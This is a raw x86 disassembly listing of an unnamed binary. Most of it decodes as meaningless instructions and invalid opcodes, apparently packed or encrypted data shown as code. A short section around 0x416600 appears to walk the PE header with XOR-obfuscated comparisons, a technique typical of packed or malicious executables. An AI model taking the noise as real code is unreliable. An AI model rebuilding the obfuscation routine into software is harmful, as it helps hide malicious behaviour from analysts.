  41622a:	(bad)  
  41622b:	retf   
  41622c:	inc    ebx
  41622d:	mov    ecx,0x200c54
  416232:	rol    DWORD PTR [edx],1
  416234:	fnstsw ax
  416236:	(bad)  
  416237:	or     al,0x75
  416239:	inc    ebp
  41623a:	dec    ebx
  41623b:	fisttp QWORD PTR [ebx-0x1b]
  41623e:	in     al,dx
  41623f:	and    BYTE PTR [eax-0x41],bl
  416242:	(bad)  
  416243:	pop    edi
  416244:	inc    ecx
  416245:	ds ret 
  416247:	xchg   BYTE PTR [esi+0x6c],ah
  41624a:	call   0x1ae1:0x98c620e1
  416251:	scas   eax,DWORD PTR es:[edi]
  416252:	imul   ebx,ebp,0xb3bc8138
  416258:	jo     0x416281
  41625a:	test   edi,0x2a986e15
  416260:	ja     0x4161e2
  416262:	push   esp
  416263:	xchg   edi,eax
  416264:	stos   DWORD PTR es:[edi],eax
  416265:	sbb    bh,ah
  416267:	xchg   ebx,eax
  416268:	out    0xfd,al
  41626a:	adc    bh,BYTE PTR [edi-0x4a]
  41626d:	push   ecx
  41626e:	jmp    0xce1:0xb7b51bc6
  416275:	das    
  416276:	add    edi,DWORD PTR [edx-0x74]
  416279:	repz mov ah,0x86
  41627c:	adc    bl,BYTE PTR [ecx+ebp*8-0x3600a417]
  416283:	mov    al,ds:0x72f3df05
  416288:	stc    
  416289:	mov    ecx,edi
  41628b:	stos   BYTE PTR es:[edi],al
  41628c:	out    dx,eax
  41628d:	cmp    ebx,ecx
  41628f:	ins    BYTE PTR es:[edi],dx
  416290:	repnz xor DWORD PTR [esi+eax*1],edi
  416294:	ret    0xda04
  416297:	dec    ecx
  416298:	mov    esp,0xe32f8d17
  41629d:	(bad)  
  41629e:	std    
  41629f:	push   ebp
  4162a0:	cmp    esp,DWORD PTR [ebx+0x6c]
  4162a3:	xchg   esi,eax
  4162a4:	retf   0x659b
  4162a7:	mov    esp,0x8bc475cf
  4162ac:	jp     0x4162c4
  4162ae:	adc    al,0x66
  4162b0:	call   0x6d3c4b3d
  4162b5:	ins    BYTE PTR es:[edi],dx
  4162b6:	pop    eax
  4162b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b8:	cmp    edi,edi
  4162ba:	sub    al,0x18
  4162bc:	fdivr  st,st(7)
  4162be:	adc    BYTE PTR [eax],dh
  4162c0:	nop
  4162c1:	add    BYTE PTR [ebx-0x65],ch
  4162c4:	(bad)  
  4162c5:	and    BYTE PTR [edx],dl
  4162c7:	sub    al,0x5e
  4162c9:	and    edi,edi
  4162cb:	cmp    eax,0x25b617a0
  4162d0:	adc    bh,BYTE PTR [edx-0x70a35020]
  4162d6:	xchg   ebx,eax
  4162d7:	fucomi st,st(1)
  4162d9:	in     al,0x67
  4162db:	out    dx,eax
  4162dc:	mov    esp,0xaa81beb0
  4162e1:	ss mov ah,0xf7
  4162e4:	fadd   DWORD PTR [ebx]
  4162e6:	push   ds
  4162e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e8:	xor    ecx,DWORD PTR [edi+edx*4-0x245f58a1]
  4162ef:	in     eax,dx
  4162f0:	call   0xc82b:0xa00afb28
  4162f7:	xlat   BYTE PTR ds:[ebx]
  4162f8:	in     al,dx
  4162f9:	mov    cs,WORD PTR [edi]
  4162fb:	cmp    ah,ah
  4162fd:	iret   
  4162fe:	ror    BYTE PTR [eax],1
  416300:	fadd   QWORD PTR [edi+0x7f]
  416303:	add    BYTE PTR [edx],dh
  416305:	jg     0x4162c8
  416307:	lods   al,BYTE PTR ds:[esi]
  416308:	repz xor al,ch
  41630b:	fwait
  41630c:	pusha  
  41630d:	lods   eax,DWORD PTR ds:[esi]
  41630e:	mov    ecx,DWORD PTR [esi*1-0x16d37b74]
  416315:	jbe    0x416369
  416317:	fcmovnbe st,st(5)
  416319:	add    eax,0xe4e68a4
  41631e:	jne    0x4162ed
  416320:	pusha  
  416321:	test   al,0x74
  416323:	adc    eax,0x5d3c56e5
  416328:	js     0x416305
  41632a:	mov    ch,0x19
  41632c:	mov    ah,0xb2
  41632e:	dec    esp
  41632f:	lahf   
  416330:	aaa    
  416331:	push   cs
  416332:	jecxz  0x4163a2
  416334:	xor    bh,0x7f
  416337:	xchg   DWORD PTR ds:[ebp+eax*2+0x621bb3e9],ebp
  41633f:	je     0x4162ff
  416341:	mov    ah,0x15
  416343:	pop    ecx
  416344:	int    0xd3
  416346:	ret    
  416347:	ja     0x416324
  416349:	mov    eax,ds:0xaa4760d7
  41634e:	pop    es
  41634f:	shl    ebx,0xd8
  416352:	js     0x41635c
  416354:	jb     0x4163d3
  416356:	and    BYTE PTR [ecx],cl
  416358:	mov    bh,0x49
  41635a:	jb     0x416335
  41635c:	cwde   
  41635d:	cs retf 0x61df
  416361:	aam    0x25
  416363:	out    0x6d,al
  416365:	pop    ecx
  416366:	je     0x41634c
  416368:	outs   dx,DWORD PTR ds:[esi]
  416369:	retf   
  41636a:	xor    DWORD PTR [eax+ecx*8+0x70b29779],ecx
  416371:	fwait
  416372:	neg    eax
  416374:	mov    ebx,0xa1a11234
  416379:	adc    DWORD PTR ds:[ebp-0x46],ebp
  41637d:	xchg   esi,eax
  41637e:	jge    0x416366
  416380:	xlat   BYTE PTR ds:[ebx]
  416381:	loopne 0x416370
  416383:	pop    ecx
  416384:	push   ds
  416385:	pop    ebx
  416386:	arpl   WORD PTR [ebx],ax
  416388:	dec    esp
  416389:	(bad)  
  41638a:	out    dx,eax
  41638b:	in     al,0xcb
  41638d:	xor    eax,0x38eaf96b
  416392:	es push ecx
  416394:	out    0x96,eax
  416396:	cmp    DWORD PTR [ecx+0x72c0f365],0x5c
  41639d:	enter  0x1f1e,0x90
  4163a1:	xchg   edx,eax
  4163a2:	cmp    ebp,ebx
  4163a4:	loop   0x41633b
  4163a6:	xor    DWORD PTR [ecx-0x34],0xffffffdd
  4163aa:	adc    ch,BYTE PTR [edi-0x72]
  4163ad:	mov    ch,0xb7
  4163af:	icebp  
  4163b0:	fs int3 
  4163b2:	sbb    al,0x38
  4163b4:	ja     0x416379
  4163b6:	or     dh,BYTE PTR [ebx+0x29]
  4163b9:	js     0x416425
  4163bb:	dec    ebp
  4163bc:	push   ecx
  4163bd:	cmp    DWORD PTR ds:0x62bc4076,esi
  4163c3:	xor    DWORD PTR [edx+eax*8+0x45cde37d],edi
  4163ca:	mov    bl,0xd4
  4163cc:	xchg   edi,eax
  4163cd:	lods   eax,DWORD PTR ds:[si]
  4163cf:	add    dl,al
  4163d1:	add    DWORD PTR [edx],ebx
  4163d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d4:	int    0x6a
  4163d6:	(bad)  
  4163d8:	adc    esp,DWORD PTR [edx+0x665ccb1]
  4163de:	xor    eax,0x2816b19e
  4163e3:	test   al,0xcd
  4163e5:	dec    esi
  4163e6:	inc    esp
  4163e7:	dec    ecx
  4163e9:	xor    eax,0xae4c84a6
  4163ee:	test   al,0xb5
  4163f0:	outs   dx,DWORD PTR ds:[esi]
  4163f1:	or     al,0xc3
  4163f3:	add    eax,DWORD PTR [edx+0x2eb90dbc]
  4163f9:	lods   eax,DWORD PTR ds:[esi]
  4163fa:	pop    ebp
  4163fb:	inc    edx
  4163fc:	add    BYTE PTR [edx],0x5b
  4163ff:	(bad)  
  416400:	cmp    bh,BYTE PTR [edx]
  416402:	stos   DWORD PTR es:[edi],eax
  416403:	fwait
  416404:	sub    ah,BYTE PTR [ebx+0x35]
  416407:	in     eax,dx
  416408:	loop   0x4163e8
  41640a:	sbb    ah,cl
  41640c:	mov    ds:0xd5377caf,eax
  416411:	push   0x1739db74
  416416:	and    ch,BYTE PTR [ebx*8+0x15d7124d]
  41641d:	fisttp DWORD PTR gs:[edi]
  416420:	adc    cl,BYTE PTR ds:0x36aae1c3
  416426:	xchg   esi,eax
  416427:	enter  0x83d3,0x85
  41642b:	mov    edx,0x7ec86101
  416430:	or     DWORD PTR [ebp+0x6c876593],esi
  416436:	xchg   esi,eax
  416437:	loope  0x41641f
  416439:	jmp    0xfcedd1b5
  41643e:	sub    BYTE PTR [edx+0x79bd901a],dh
  416444:	inc    eax
  416445:	cs (bad) 
  416447:	imul   ecx,DWORD PTR [ebp-0x6d],0x1a
  41644b:	and    eax,0xe1246824
  416450:	mov    bl,BYTE PTR [ebx]
  416452:	sbb    bh,BYTE PTR ds:0x9023ba49
  416458:	sub    al,0x3c
  41645a:	inc    esp
  41645b:	jo     0x416471
  41645d:	adc    bl,BYTE PTR [ebx+0x67812e60]
  416463:	jnp    0x416438
  416465:	or     ebp,DWORD PTR [eax+eiz*8]
  416468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416469:	xchg   esi,eax
  41646a:	repz retf 
  41646c:	add    cl,0x8b
  41646f:	stc    
  416470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416471:	fstp   QWORD PTR [ebx+edx*4]
  416474:	fwait
  416475:	int3   
  416476:	aaa    
  416477:	int3   
  416478:	sub    DWORD PTR [eax-0x1ac4a5c7],edi
  41647e:	ret    
  41647f:	xor    al,bh
  416481:	inc    ebx
  416482:	xlat   BYTE PTR ds:[ebx]
  416483:	sbb    al,0xfd
  416485:	push   0xad318d80
  41648a:	sbb    BYTE PTR [edi],ah
  41648c:	rcr    DWORD PTR [esi-0x41007900],cl
  416492:	call   0xb515:0x6be947b5
  416499:	jmp    0xe9322754
  41649e:	jb     0x41646e
  4164a0:	and    BYTE PTR [ebx-0x5f],dh
  4164a3:	jae    0x416469
  4164a5:	imul   ebp,DWORD PTR ds:0x52b1479e,0x37
  4164ac:	dec    eax
  4164ad:	sbb    al,0x39
  4164af:	call   0xf3ce:0xe7e2879d
  4164b6:	mov    ecx,0xbaae604a
  4164bb:	fisub  WORD PTR [ecx+eiz*2+0x7832f903]
  4164c2:	xchg   esi,ebx
  4164c4:	dec    esi
  4164c5:	hlt    
  4164c6:	int3   
  4164c7:	fiadd  DWORD PTR [edi+0x1e]
  4164ca:	pop    es
  4164cb:	and    dh,bl
  4164cd:	test   al,0xf
  4164cf:	mov    edi,0x490da155
  4164d4:	div    BYTE PTR [eax]
  4164d6:	jns    0x4164e5
  4164d8:	adc    edi,0xffffff83
  4164db:	dec    esi
  4164dc:	push   ebx
  4164dd:	mov    ds:0xa591ccd9,al
  4164e2:	or     eax,0xfd62419
  4164e7:	mov    edi,0xe8efb6e
  4164ec:	ins    BYTE PTR es:[edi],dx
  4164ed:	jmp    0x2b2f:0xa3728782
  4164f4:	cmp    dl,BYTE PTR [ebx+ecx*4+0x3f]
  4164f8:	pushf  
  4164f9:	aam    0x73
  4164fb:	arpl   sp,sp
  4164fd:	(bad)  
  4164fe:	je     0x4164fb
  416500:	test   al,0xd2
  416502:	push   es
  416503:	ds push ebp
  416505:	sbb    dl,cl
  416507:	mov    ch,0x6
  416509:	xchg   esi,eax
  41650a:	pop    edx
  41650b:	mov    ebx,0x5025fd44
  416510:	ret    
  416511:	lods   al,BYTE PTR ds:[esi]
  416512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416513:	mov    ss,WORD PTR [edi-0x3c]
  416516:	push   ds
  416517:	dec    edx
  416518:	jg     0x416528
  41651a:	fimul  WORD PTR [edi]
  41651c:	retf   
  41651d:	cwde   
  41651e:	and    BYTE PTR [edi+eax*4-0x58],cl
  416522:	sbb    al,0xbf
  416524:	sbb    ebp,DWORD PTR ds:0xaef2407f
  41652a:	aaa    
  41652b:	ret    
  41652c:	push   edx
  41652d:	sub    dh,BYTE PTR [edx]
  41652f:	or     al,0x2b
  416531:	daa    
  416532:	stos   BYTE PTR es:[edi],al
  416533:	aas    
  416534:	dec    edx
  416535:	cld    
  416536:	inc    esi
  416537:	fistp  DWORD PTR [edi+edx*8+0xf]
  41653b:	sub    eax,0xc42841b0
  416540:	xchg   edx,eax
  416541:	arpl   WORD PTR [ebx-0x36],ax
  416544:	dec    ebx
  416545:	ret    
  416546:	mov    al,0x4c
  416548:	fidiv  WORD PTR [ebp+0x43f4696f]
  41654e:	(bad)  
  41654f:	retf   0xae0
  416552:	mov    ebx,0x1ec00e15
  416557:	dec    ebp
  416558:	and    eax,0xb581c2d1
  41655d:	dec    ebx
  41655e:	test   al,0x98
  416560:	mov    ss,WORD PTR [ebp+0x762bfa2b]
  416566:	xchg   ebx,eax
  416567:	ds mov dh,0x29
  41656a:	push   ebp
  41656b:	adc    ch,ah
  41656d:	cmp    eax,0x9184b0ed
  416572:	or     bh,BYTE PTR [ebp-0x73]
  416575:	or     bl,BYTE PTR [eax+0x1c]
  416578:	mov    ah,0xe9
  41657a:	(bad)  
  41657b:	addr16 push es
  41657d:	adc    eax,0x61baf72a
  416582:	repz ficomp WORD PTR [ebx]
  416585:	jg     0x416517
  416587:	sbb    BYTE PTR [edx+edx*4+0x30],0x6f
  41658c:	jl     0x416552
  41658e:	dec    ebx
  41658f:	mov    bl,0xe5
  416591:	adc    ah,ch
  416593:	jno    0x41655e
  416595:	pmullw mm1,QWORD PTR [edi]
  416598:	push   ebp
  416599:	mov    ch,0xe1
  41659b:	mov    gs,WORD PTR [edi+0x2b57a02e]
  4165a1:	xor    dl,BYTE PTR [edi-0x42]
  4165a4:	hlt    
  4165a5:	xchg   al,dl
  4165a7:	mov    edi,0x674aba74
  4165ac:	(bad)  
  4165ad:	rol    BYTE PTR [ebp-0x13],1
  4165b0:	(bad)  
  4165b1:	push   ebx
  4165b2:	sbb    al,0x45
  4165b4:	or     ch,bh
  4165b6:	dec    edx
  4165b7:	dec    esp
  4165b8:	jae    0x416571
  4165ba:	cld    
  4165bb:	xchg   ebx,eax
  4165bc:	pop    ebp
  4165bd:	cs call 0x453f1b0b
  4165c3:	shr    ebp,1
  4165c5:	outs   dx,DWORD PTR ds:[esi]
  4165c6:	xchg   esi,eax
  4165c7:	add    BYTE PTR [ecx-0x56],al
  4165ca:	test   ecx,ebp
  4165cc:	xlat   BYTE PTR ds:[ebx]
  4165cd:	add    edi,DWORD PTR [edx+0xbf1935a]
  4165d3:	jp     0x41656d
  4165d5:	pop    edx
  4165d6:	xchg   esp,eax
  4165d7:	jle    0x416646
  4165d9:	xchg   esi,eax
  4165da:	mov    dh,0x24
  4165dc:	xchg   esi,eax
  4165dd:	(bad)  
  4165de:	getsec 
  4165e0:	out    0x67,al
  4165e2:	pop    edi
  4165e3:	or     cl,0x3a
  4165e6:	or     al,0x43
  4165e8:	mov    al,0x39
  4165ea:	fwait
  4165eb:	mov    bl,0xd5
  4165ed:	xchg   ebx,eax
  4165ee:	outs   dx,BYTE PTR ds:[esi]
  4165ef:	imul   ebx,DWORD PTR [ecx+esi*2-0xc],0x39
  4165f4:	repz pop di
  4165f7:	(bad)  
  4165f8:	clc    
  4165f9:	mov    dh,0xf
  4165fb:	test   DWORD PTR [edx],esp
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dh,BYTE PTR [edi-0x62]
  416674:	mov    ah,BYTE PTR ds:0x626123db
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	(bad)  
  41667f:	or     eax,0xc3d55c4d
  416684:	push   ss
  416685:	add    DWORD PTR ss:[ebp-0x6ce97feb],ecx
  41668c:	data16 jecxz 0x4166e8
  41668f:	add    eax,0x49d0812b
  416694:	and    BYTE PTR [esi-0x2fee4aaa],dh
  41669a:	je     0x416665
  41669c:	call   edi
  41669e:	loopne 0x416656
  4166a0:	xchg   esi,eax
  4166a1:	fiadd  WORD PTR [esi]
  4166a3:	sub    dh,bl
  4166a5:	sub    al,0x41
  4166a7:	icebp  
  4166a8:	hlt    
  4166a9:	pop    es
  4166aa:	dec    eax
  4166ab:	nop
  4166ac:	xor    al,0x48
  4166ae:	add    BYTE PTR [ebp-0x10abf9de],cl
  4166b4:	xchg   ebp,eax
  4166b5:	push   ecx
  4166b6:	(bad)  
  4166b7:	sub    BYTE PTR [ecx],bl
  4166b9:	mov    al,0x26
  4166bb:	das    
  4166bc:	pop    edi
  4166bd:	into   
  4166be:	pop    esi
  4166bf:	jecxz  0x416704
  4166c1:	scas   al,BYTE PTR es:[edi]
  4166c2:	jae    0x416653
  4166c4:	sar    BYTE PTR [ebp-0x4b806728],0x21
  4166cb:	pop    ds
  4166cc:	xchg   esp,eax
  4166cd:	lods   al,BYTE PTR ds:[esi]
  4166ce:	xor    al,ch
  4166d0:	jne    0x416668
  4166d2:	test   BYTE PTR [ebp-0x54],bl
  4166d5:	mov    ebp,0xa7f88c04
  4166da:	inc    edx
  4166db:	sbb    al,0x61
  4166dd:	or     BYTE PTR [ecx],dh
  4166df:	icebp  
  4166e0:	addr16 jmp 0xb6a0b13c
  4166e6:	jnp    0x4166df
  4166e8:	ret    0x7004
  4166eb:	shr    BYTE PTR [edx],cl
  4166ed:	mov    ah,0x90
  4166ef:	ins    BYTE PTR es:[edi],dx
  4166f0:	les    esp,FWORD PTR [esi+0x346d2628]
  4166f6:	sub    dl,BYTE PTR [edi+0x1317bd6f]
  4166fc:	(bad)  
  4166fd:	test   eax,0x3f1cc2ee
  416702:	xchg   edx,eax
  416703:	je     0x416756
  416705:	and    BYTE PTR [edx-0x6d],bl
  416708:	adc    cl,BYTE PTR [edx+0x50]
  41670b:	fidivr WORD PTR [ecx+0x3d4fd28b]
  416711:	pop    eax
  416712:	xor    DWORD PTR [ebx+0x5a],ecx
  416715:	(bad)  
  416716:	mov    DWORD PTR [esi-0x15],0x3c41bda9
  41671d:	push   ds
  41671e:	daa    
  41671f:	inc    esp
  416720:	dec    esp
  416721:	clc    
  416722:	pop    ebp
  416723:	repz in eax,dx
  416725:	xor    dl,0x24
  416728:	mov    bl,0x79
  41672a:	fdivr  DWORD PTR [ebx-0x4e]
  41672d:	(bad)  
  41672e:	clc    
  41672f:	mov    eax,ds:0x1c86ab2a
  416734:	add    ch,BYTE PTR [eax+edi*4]
  416737:	push   edx
  416738:	add    DWORD PTR [edi+0x3],ebx
  41673b:	push   ecx
  41673c:	inc    esi
  41673d:	std    
  41673e:	in     al,dx
  41673f:	add    edx,DWORD PTR [ecx+0xb]
  416742:	and    al,0x2c
  416744:	pop    ds
  416745:	dec    ebp
  416746:	mov    bh,0x61
  416748:	or     DWORD PTR [ecx],eax
  41674a:	add    ah,BYTE PTR [ecx-0x2cb7c9a1]
  416750:	shr    DWORD PTR [eax+0x49],1
  416753:	inc    ebp
  416754:	sbb    esp,DWORD PTR [edx+0x7f]
  416757:	icebp  
  416758:	hlt    
  416759:	or     BYTE PTR gs:[edi+0x1b382774],al
  416760:	(bad)  
  416761:	sti    
  416762:	call   0xdf7e1881
  416767:	cmp    ah,ah
  416769:	mov    ecx,0x790e62f9
  41676e:	jae    0x4167dd
  416770:	dec    edi
  416771:	sub    bh,dh
  416773:	pop    esi
  416774:	dec    edi
  416775:	aam    0x28
  416777:	pop    esi
  416778:	std    
  416779:	ror    DWORD PTR [ebx],0xaa
  41677c:	fild   DWORD PTR [ebp-0x5c]
  41677f:	inc    esp
  416780:	fwait
  416781:	ins    DWORD PTR es:[edi],dx
  416782:	push   ebp
  416783:	ins    BYTE PTR es:[edi],dx
  416784:	(bad)  
  416786:	jp     0x41676f
  416788:	dec    edi
  416789:	mov    ah,0x2c
  41678b:	repnz cdq 
  41678d:	mov    edi,0x37b23de0
  416792:	push   cs
  416793:	jae    0x4167a7
  416795:	loop   0x4167e6
  416797:	mov    ah,0x68
  416799:	dec    edi
  41679a:	jbe    0x4167d6
  41679c:	sub    DWORD PTR [edi],ebx
  41679e:	stos   BYTE PTR es:[edi],al
  41679f:	leave  
  4167a0:	mov    al,0xb7
  4167a2:	cmp    eax,ebp
  4167a4:	shr    DWORD PTR [ecx+0x71],1
  4167a7:	mov    edx,esp
  4167a9:	leave  
  4167aa:	mov    dh,BYTE PTR [ebp-0x138b1e4e]
  4167b0:	(bad)  
  4167b1:	clc    
  4167b2:	xchg   ebp,eax
  4167b3:	mov    eax,0x885c011b
  4167b8:	sub    BYTE PTR [ebx+0x9],dl
  4167bb:	fldenv [ebp+0x9]
  4167be:	cmp    ebp,DWORD PTR [ecx-0x2059fbb]
  4167c4:	rcl    esp,1
  4167c6:	call   0x57ab7f35
  4167cb:	std    
  4167cc:	call   0x37cd:0x510e302d
  4167d3:	add    BYTE PTR [edi-0x5758eef4],0x70
  4167da:	(bad)  
  4167dc:	push   ss
  4167dd:	fst    DWORD PTR [edi-0x5ad77167]
  4167e3:	push   esi
  4167e4:	loopne 0x4167cd
  4167e6:	pushf  
  4167e7:	sahf   
  4167e8:	or     edi,ecx
  4167ea:	call   0x9f473e4b
  4167ef:	xor    al,0xed
  4167f1:	or     esi,DWORD PTR [edx-0x571b40dc]
  4167f7:	xchg   ebp,eax
  4167f8:	aaa    
  4167f9:	xchg   esp,eax
  4167fa:	sbb    eax,0x15bfd366
  4167ff:	in     eax,0x62
  416801:	sbb    cl,0x1
  416804:	mov    al,0xe8
  416806:	in     eax,dx
  416807:	sahf   
  416808:	js     0x4167f7
  41680a:	inc    ebp
  41680b:	jb     0x4167cb
  41680d:	mov    esp,0x6b79c03e
  416812:	fsubr  DWORD PTR [edx]
  416814:	sbb    DWORD PTR [ebx-0x64],eax
  416817:	leave  
  416818:	inc    ebx
  416819:	adc    al,0xd3
  41681b:	fistp  QWORD PTR [esi+0x711e96ac]
  416821:	pop    edi
  416822:	je     0x4167b9
  416824:	in     eax,0xfa
  416826:	imul   edx,DWORD PTR [ecx],0xffffff89
  416829:	mov    cl,BYTE PTR [edx-0x521bcff0]
  41682f:	enter  0xeeff,0x1f
  416833:	inc    ebx
  416834:	popa   
  416835:	xchg   edx,eax
  416836:	xchg   edx,eax
  416837:	stos   DWORD PTR es:[edi],eax
  416838:	pop    edi
  416839:	push   eax
  41683a:	push   ebp
  41683b:	push   ds
  41683c:	aaa    
  41683d:	retf   
  41683e:	adc    eax,0x34c3b583
  416843:	pop    es
  416844:	sub    al,0xb8
  416846:	pop    edx
  416847:	mov    al,ds:0x81cd49d1
  41684c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41684d:	mov    edx,DWORD PTR [ebp+0x0]
  416850:	es test eax,0x2b039601
  416856:	xchg   edx,eax
  416857:	aaa    
  416858:	stos   DWORD PTR es:[edi],eax
  416859:	ret    0x7b07
  41685c:	pop    esp
  41685d:	test   eax,0x1f1b3cc8
  416862:	out    0x93,eax
  416864:	dec    eax
  416865:	dec    esp
  416866:	sub    ah,cl
  416868:	adc    eax,0x4465a050
  41686d:	fadd   DWORD PTR [ecx+0x72]
  416870:	or     eax,0xfcab09f0
  416875:	mov    dl,0xfc
  416877:	les    esi,FWORD PTR [esi+0xc927814]
  41687d:	sbb    ah,al
  41687f:	retf   
  416880:	rol    BYTE PTR [edi-0x13b1c208],cl
  416886:	ds and ch,cl
  416889:	call   0x1c08:0xc4f9862e
  416890:	inc    ebp
  416891:	icebp  
  416892:	bnd ret 0xfc74
  416896:	inc    ebx
  416897:	jo     0x4168c9
  416899:	adc    DWORD PTR [ecx-0x8],0x26
  41689d:	stos   DWORD PTR es:[edi],eax
  41689e:	xchg   ecx,eax
  41689f:	shl    BYTE PTR [eax-0x24151e0c],0xc4
  4168a6:	cmc    
  4168a7:	and    DWORD PTR ss:[edi+0x4de95e56],edi
  4168ae:	add    ebx,DWORD PTR [ecx]
  4168b0:	inc    ebx
  4168b1:	mov    dl,0x7f
  4168b3:	ret    
  4168b4:	mov    edi,0x460985c5
  4168b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ba:	jb     0x41685b
  4168bc:	inc    edi
  4168bd:	push   es
  4168be:	mov    edi,0x1e47e053
  4168c3:	scas   al,BYTE PTR es:[edi]
  4168c4:	adc    ebx,DWORD PTR [edi-0x1f]
  4168c7:	mov    dl,0xe6
  4168c9:	mov    al,0x57
  4168cb:	xor    edi,eax
  4168cd:	xchg   esp,eax
  4168ce:	xor    DWORD PTR [esi],esp
  4168d0:	push   eax
  4168d1:	shl    edi,cl
  4168d3:	inc    eax
  4168d4:	shl    BYTE PTR [edx+eiz*2+0x43],0xb4
  4168d9:	sub    bl,ah
  4168db:	mov    WORD PTR [edi],fs
  4168dd:	pop    ebp
  4168de:	push   edi
  4168df:	add    al,0x58
  4168e1:	daa    
  4168e2:	dec    edi
  4168e3:	ror    BYTE PTR [edi-0xb],1
  4168e6:	cld    
  4168e7:	pop    esp
  4168e8:	popa   
  4168e9:	jecxz  0x4168c9
  4168eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168ec:	pop    ebx
  4168ed:	sbb    BYTE PTR [edi],0xe7
  4168f0:	adc    DWORD PTR [edx],edx
  4168f2:	jmp    0xf419c3b1
  4168f7:	sbb    eax,esp
  4168f9:	push   cs
  4168fa:	sub    al,0x8
  4168fc:	mov    al,ds:0x1e5d6cd7
  416901:	sbb    DWORD PTR [ecx],esp
  416903:	xor    dl,BYTE PTR ds:0x57458102
  416909:	mov    edx,0xf7cfe3ce
  41690e:	ja     0x416932
  416910:	sub    BYTE PTR [ecx+0x22],dh
  416913:	retf   
  416914:	daa    
  416915:	aaa    
  416916:	mov    DWORD PTR [edi-0x7dd87be1],ebp
  41691c:	dec    edx
  41691d:	xor    DWORD PTR [edx+esi*2+0x49],eax
  416921:	test   al,0x60
  416923:	sbb    eax,0x244a975c
  416928:	into   
  416929:	dec    esp
  41692a:	or     esp,DWORD PTR [ebx+0x74c96b45]
  416930:	sub    DWORD PTR [edi],0x71030aea
  416936:	mov    edx,0x60690eed
  41693b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693c:	scas   eax,DWORD PTR es:[edi]
  41693d:	push   esi
  41693e:	sahf   
  41693f:	sbb    DWORD PTR [ebx*2-0x535e4e40],ecx
  416946:	sahf   
  416947:	push   ds
  416948:	or     esp,DWORD PTR [ecx]
  41694a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694b:	lea    edi,[eax-0xf028543]
  416951:	or     al,BYTE PTR [eax+0x5d]
  416954:	test   DWORD PTR [ebp-0x2b],0xa940df09
  41695b:	ror    ebp,1
  41695d:	push   0x6b
  41695f:	sti    
  416960:	stc    
  416961:	loopne 0x416946
  416963:	(bad)  
  416965:	or     bl,BYTE PTR [ecx-0xc0fac3a]
  41696b:	imul   ebx,edx,0x2e
  41696e:	mov    ds,WORD PTR [esi+0x494e2cfd]
  416974:	arpl   WORD PTR [edx+edi*1-0x59],sp
  416978:	mov    ds:0x7abb3f8a,eax
  41697d:	inc    eax
  41697e:	es pop ds
  416980:	sub    edx,DWORD PTR [esi]
  416982:	pop    ebp
  416983:	push   ebp
  416984:	popa   
  416985:	stos   BYTE PTR es:[edi],al
  416986:	sub    ecx,esp
  416988:	adc    al,0xba
  41698a:	dec    esp
  41698b:	pop    esi
  41698c:	and    eax,0x488fa507
  416991:	icebp  
  416992:	push   edx
  416993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416994:	fidiv  DWORD PTR [ecx]
  416996:	rcr    DWORD PTR [edx-0x20],1
  416999:	ret    
  41699a:	(bad)  
  41699b:	pushf  
  41699c:	sbb    edi,edi
  41699e:	int3   
  41699f:	arpl   WORD PTR [ebx-0x54],bp
  4169a2:	pop    ss
  4169a3:	xchg   dl,al
  4169a5:	cmp    ecx,DWORD PTR [edx+0x42]
  4169a8:	es push eax
  4169aa:	stos   DWORD PTR es:[edi],eax
  4169ab:	outs   dx,DWORD PTR ds:[esi]
  4169ac:	aad    0x41
  4169ae:	push   ds
  4169af:	inc    edi
  4169b0:	out    dx,al
  4169b1:	push   ecx
  4169b2:	gs (bad) 
  4169b4:	popa   
  4169b5:	xchg   edi,eax
  4169b6:	or     eax,0xd30ade1c
  4169bb:	popf   
  4169bc:	aad    0xad
  4169be:	adc    edx,0x7f2af846
  4169c4:	retf   0x8bd3
  4169c7:	out    0x44,al
  4169c9:	ss fcmove st,st(5)
  4169cc:	add    eax,0xddbe2185
  4169d1:	inc    ecx
  4169d2:	es ja  0x416a2b
  4169d5:	(bad)  
  4169d6:	and    eax,DWORD PTR [eax+ebp*4+0x5c230d49]
  4169dd:	das    
  4169de:	dec    ecx
  4169df:	test   DWORD PTR [edi-0xc],0x1ed40c0d
  4169e6:	pop    ebx
  4169e7:	aad    0xef
  4169e9:	bnd jbe 0x41697e
